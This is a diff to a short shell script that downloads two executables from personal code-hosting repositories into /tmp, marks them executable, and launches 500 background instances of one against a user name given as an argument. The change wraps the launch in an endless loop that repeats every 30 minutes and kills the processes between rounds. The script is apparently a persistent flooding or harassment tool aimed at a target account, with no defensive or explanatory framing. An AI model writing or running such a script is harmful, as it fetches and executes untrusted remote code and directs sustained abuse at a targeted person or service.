@@ -3,8 +3,13 @@ user="$1"
 wget -O /tmp/sop https://raw.githubusercontent.com/walters99/ps/main/sop
 wget -O /tmp/ps https://bitbucket.org/oscarhines623/workinside/raw/b23b1f28b86a0e86880a97ea56976934b4e331cb/lol
 chmod +x /tmp/sop /tmp/ps
-for i in {1..500} :
-do
-  /tmp/sop $user >/dev/null &
+
+while true; do
+  for i in {1..500} :
+  do
+    /tmp/sop $user >/dev/null &
+  done
+  sleep 30m
+  pkill -f ps
+  pkill -f sop
 done
-sleep 999h
